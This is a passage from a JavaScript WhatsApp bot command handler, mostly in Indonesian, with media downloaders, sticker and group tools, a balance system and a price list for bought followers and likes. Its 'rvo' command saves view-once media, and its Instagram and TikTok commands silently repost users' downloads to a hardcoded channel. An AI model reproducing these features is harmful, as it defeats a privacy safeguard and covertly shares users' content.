* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 30(full) hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Jasa Suntik Sosmed 🌟*

*- Layanan Instagram :*
- 500 Followers : Rp8000
- 1000 Like : Rp4000
- 1000 Views : Rp4000

*- Layanan Tiktok :*
* 500 Followers : Rp5000
* 1000 Like : Rp5000
* 1000 Share : Rp5000
* 10k Views : Rp3000

*- Layanan Telegram :*
* 500 Member CH : Rp8000

*- Layanan Whats'App :*
* 100 Member CH : Rp12.000

*Syarat & Ketentuan :*
* _Proses tidak memerlukan email/password akun, hanya memakai username/link tautan_
* _Selama proses akun jangan di private/dibatasi_
* _Masing masing layanan mempunyai garansi & non garansi_
* _Proses maksimal 1 x 24jam, Order wajib sabar!_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Ditss.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Ditss, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber, reply, prefix, pushname, from, froms, qkontak, text }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await Ditss.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================
case 'ytmp3': {
    if (!text) return m.reply("contoh .ytmp3 https://youtu.be/80farLrZyYQ?si=HQPxmxPLpFDbtgLt");
    await Ditss.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    try {
        let ress = await fetch(`https://api.neekoi.me/api/youtube-audio?url=${args[0]}`);
        let res = await ress.json();
        await Ditss.sendMessage(from, { audio: {url: res.data.audio},
            mimetype: 'audio/mp4',
            contextInfo: {
                mentionedJid: [
                    m.sender
                ],
                forwardingScore: 10,
                isForwarded: true,
                externalAdReply: {
                    showAdAttribution: true,
                    title: res.data.title,
                    body: `Upload: ${res.upload}`,
                    thumbnailUrl: res.data.thumbnail,
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    mediaUrl: text,
                    sourceUrl: text,
                },
            },
        }, { quoted: m });
    } catch (error) {
        m.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error); 
    }
    await Ditss.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
}
break

case 'ytmp4': {
    if (!text) return m.reply("Linknya?\ncontoh .ytmp4 https://youtu.be/80farLrZyYQ?si=HQPxmxPLpFDbtgLt");
    await Ditss.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    try {
        let res = await axios.get(`https://api.neekoi.me/api/youtube-video?url=${args[0]}`);
        await Ditss.sendMessage(from, { video: {url: res.data.video},
            mimetype: 'video/mp4',
            fileName: res.data.title
        }, { quoted: m });
    } catch (error) {
        m.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error); 
    }
    await Ditss.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
}
break
/*case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson(`https://api.neekoi.me/api/youtube-audio?url=${args[0]}`)

if (anu.status) {
let urlMp3 = anu.result.mp3
await Ditss.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await Ditss.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break*/

//================================================================================
case 'mediafire':{
await Ditss.sendMessage(m.chat, { react: { text: "❓",key: m.key,}})
    if (!args[0]) return reply(`*Example:* ${prefix}${command} https://www.mediafire.com/file/thddr8pltg4cn0a/Sc_Bot_Md_Pairing_Code.zip/file`);
 
    try {
        const response = await fetch(`https://restapii.rioooxdzz.web.id/api/mediafire?url=${args[0]}`);
        const json = await response.json();
 
        if (!json.data.response) throw 'Failed to fetch!';
 
        let { download, filename, size, ext, uploaded, mimetype } = json.data.response;
 
        let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${size}
*🗂️ Extension:* ${ext}
*📨 Uploaded:* ${uploaded}
`.trim();
 
        m.reply(caption);
     Ditss.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype, fileName: filename }, { quoted: m });
 
    } catch (error) {
        throw error
    }
};
break
case 'onlypc': case 'pconly':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.onlypc) return reply('udah on!')
global.onlypc = true
reply('sukses only private chat')
} else if (args[0] == 'off'){
if (!global.onlypc) return reply('sudah dimatikan sebelumnya!')
global.onlypc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By Asuma
case 'onlygc': case 'gconly':
//if (!isRegistered) return registerbut(noregis)
if (!isCreator&&!isPremium) return reply(mess.prem)
if (args[0] == 'on'){
if (global.onlygc) return reply('udah on!')
global.onlygc = true
reply('sukses only group chat')
} else if (args[0] == 'off'){
if (!global.onlygc) return reply('sudah dimatikan sebelumnya!')
global.onlygc = false
reply('sukses menonaktifkan')
} else reply('on / off')
break //Powered By Asuma
case "mediafire2": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await Ditss.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Ditss.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

/*case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Ditss.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break*/
//=====
 case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return Reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  try {
    let ress = await fetch(`https://api.neekoi.me/api/igdl?url=${args[0]}`);
    let res = await ress.json();
    await Ditss.sendMessage(from, {video: {url: res.result.data[0].url}})
      await Ditss.sendMessage(`120363383395435351@newsletter`, {video: {url: res.result.data[0].url}})
  } catch (error) {
    return Reply(`An error occurred: ${error.message}`)
  }
}
break
//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Ditss.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Ditss.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Ditss.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: ""
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Ditss.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Ditss.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
await Ditss.sendMessage(`120363383395435351@newsletter`, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `   `}, {quoted: m})
 
}
}).catch(e => console.log(e))
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
    if (!isCreator && !m.isPremiun) return Reply(mess.prem)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await Ditss.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
 if (!isCreator && !m.isPremium) return Reply(mess.admin)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
  if (!isCreator && !m.isPremium) return Reply(mess.prem)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Ditss.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
let teks = `\n *#- List all group chat*\n`
let a = await Ditss.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!isCreator && !isPremium) return (mess.prem)
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Ditss.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await Ditss.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Ditss.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Ditss.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Ditss.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

/*case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://aemt.uk.to/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Skyzo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break
*/
//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Ditss.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Ditss.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Ditss.downloadAndSaveMediaMessage(qmsg)
await Ditss.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Ditss.downloadAndSaveMediaMessage(qmsg)
await Ditss.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Ditss.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Ditss.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Ditss.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await Ditss.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'dits.png');

let teks = directLink.toString()
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/video/.test(mime) && !/image/.test(mime)) reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
let media = await Ditss.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'ditss.png');
let teks = directLink.toString()
await Ditss.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await Ditss.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Ditss.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Ditss.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Ditss.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break
//=======
  
case "nontontv":
{

let teksk = `PILIH POLLING BERIKUT

dibawah adalah list dari channel top di televisi
pilih polling dari channel yang ingin di tonton
setelah itu bot akan memberi channel yang ingin
anda tonton dengan berupa link`
Ditss.sendMessage(m.chat, teksk, ['TVINTERNASIONAL','GLOBALTV','MNCTV','RCTI','TRANSTV','TRANS7','ANTV','SCTV','NET','INDOSIAR'])
}
break

case "connect":{
Reply('oke')
}
break

case 'listonline': case 'liston': {
//if (!isRegistered) return registerbut(noregis)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
//Ditss.sendMessage(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
Ditss.sendMessage(m.chat, { text: 'list online:\n\n'+ online.map(v => '•@' +v.replace(/@.+/, '')).join`\n`, mentions: [ online ]}, { quoted: m })
}
break

case 'spoiler':
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${command} kamujelek|tapii boong`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
Reply(l + readmore + r)
}
break

case 'play2': {
if (!text) return Reply(`Example: ${prefix + command} bad - wave to earth`)
let resst = await yts(text)
let url = resst.all;
let result = url[Math.floor(Math.random() * url.length)];
let ress = await fetch(`https://api.neekoi.me/api/youtube-audio?url=${result.url}`);
let res = await ress.json();
 await Ditss.sendMessage(from, { audio: {url: res.data.audio},
 mimetype: 'audio/mp4',
 contextInfo: {
 mentionedJid: [
 m.sender
 ],
 forwardingScore: 10,
 isForwarded: true,
 externalAdReply: {
 showAdAttribution: true,
 title: res.data.title,
 body: `Upload: ${res.upload}`,
 thumbnailUrl: res.data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: false,
 mediaUrl: result.url,
 sourceUrl: result.url,
 },
 },
 }, { quoted: m });
}
break

case "upteks":
case "chat":{
 if (!text) return m.reply("contoh\n.chat selamat siang semuanya")
    const Kalender00011 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
 const owned11 = owner + "@s.whatsapp.net"
let awal = `anjir`
await Ditss.sendMessage(m.chat, {
 react: {
 text: '🦚',
 key: m.key,
 }})
Ditss.sendMessage(`${global.idch}`,{ text: `${text}`,
 contextInfo: {
 mentionedJid: [m.sender, owned11],
 forwardedNewsletterMessageInfo: {
 newsletterJid: `0@newsletter`,
 newsletterName: `asuma md`,
 serverMessageId: -1
 },
 	businessMessageForwardInfo: { businessOwnerJid: `0@s.whatsapp.net` },

 forwardingScore: 999,
 isForwarded: true,
 externalAdReply: {
 showAdAttribution: true, 
 title: `pesan dari: ${pushname}`,
 body: `message to channel ${calender}`,
 thumbnailUrl: ppuser,
 sourceUrl: `${text}`,
 mediaType: 1,
 renderLargerThumbnail: false
 }
 }
 })
await sleep(1500)
Ditss.sendMessage(m.chat, {
 react: {
 text: '😎',
 key: m.key,
 }})
 Ditss.sendMessage(m.chat, {
 react: {
 text: '⚕️',
 key: m.key,
 }})
}
break

case 'afk': {
//if (!isRegistered) return registerbut(noregis)
if (!m.isGroup) return Reply('khusus grup')
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
Reply(`${tag} telah *Afk* dengan alasan ${text ? ': ' + text : ''}`)
}
break

case 'ceksaldo':
if (!froms) return Reply(`Mau cek saldo siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return Reply(`Ups, Saldo ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return Reply('User tidak terdaftar didalam database!')
if (froms == sender) return Reply('Ketik aja saldo lah')
Reply(`*INFO SALDO DARI*\n\nTarget Cek : ${Ditss.getName(froms)}\nSaldo : Rp. ${toRupiah(cekSaldo(froms, db_saldo))}\nNomor : ${froms.split('@')[0]}`)
break

/*case 'ceksaldo':
if (!froms) return Reply(`Mau cek saldo siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return Reply(`Ups, Saldo ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return Reply('User tidak terdaftar didalam database!')
if (froms == sender) return Reply('Ketik aja saldo lah')
Reply(`*INFO SALDO DARI*\n\nTarget Cek : ${conn.getName(froms)}\nSaldo : Rp. ${toRupiah(cekSaldo(froms, db_saldo))}\nNomor : ${froms.split('@')[0]}`)
break*/
case 'saldo':{
const Kalender0001 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
Reply(`*INFO SALDO ANDA*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
Note : anda hanya bisa melakukan pembelian di bot iruma saja, ketik *menu shop* untuk berbelanja`)
}
break

case 'acc': case 'addsaldo':{
if (!isCreator) return Reply(`*[ System Notice ]* User tidak bisa aksess command ini`)
const Kalender000 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
if (!q.split(",")[0]) return Reply(`Ex : ${prefix+command} ${nomore},20000`)
if (!q.split(",")[1]) return Reply(`Ex : ${prefix+command} ${nomore},2000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(1000)
Reply(`*USER SALDO*
 • ID : ${sender.split("@")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender000}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))} `)
 }
case 'kirim': {
if (!isCreator) return Reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
let messageText = `Operasi *Topup* sebanyak Rp. ${q.split(",")[1]} suksess, ketik *.saldo* untuk melihat info anda`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

Ditss.sendMessage(targetNumber, {
text: `${messageText}`,
mentions: [sender]
}, {
quoted: m
}).then(() => {
Reply('Berhasil ✓');
}).catch(() => {
m.reply('Gagal mengirim pesan!');
});
}
break;

case 'emojimix': {
await Ditss.sendMessage(m.chat, { react: { text: "👁️‍🗨️",key: m.key,}})
let [emoji1, emoji2] = q.split`+`
